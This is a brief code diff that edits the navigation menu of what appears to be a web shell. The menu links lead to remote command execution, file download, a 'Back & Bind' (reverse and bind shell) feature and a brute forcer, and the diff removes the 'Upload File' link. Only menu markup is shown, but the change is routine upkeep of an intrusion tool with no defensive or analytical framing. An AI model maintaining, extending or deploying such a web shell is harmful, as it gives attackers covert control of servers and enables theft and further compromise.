@@ -272,8 +272,7 @@ function rm_rename_form(i,file,f)
 <td colspan="2">
 <a href="$ScriptLocation">Home</a> | 
 <a href="$ScriptLocation?a=command&d=$EncodeCurrentDir">Command</a> |
-<a href="$ScriptLocation?a=gui&d=$EncodeCurrentDir">GUI</a> | 
-<a href="$ScriptLocation?a=upload&d=$EncodeCurrentDir">Upload File</a> | 
+<a href="$ScriptLocation?a=gui&d=$EncodeCurrentDir">GUI</a> |  
 <a href="$ScriptLocation?a=download&d=$EncodeCurrentDir">Download File</a> |
 <a href="$ScriptLocation?a=backbind">Back & Bind</a> |
 <a href="$ScriptLocation?a=bruteforcer">Brute Forcer</a> |
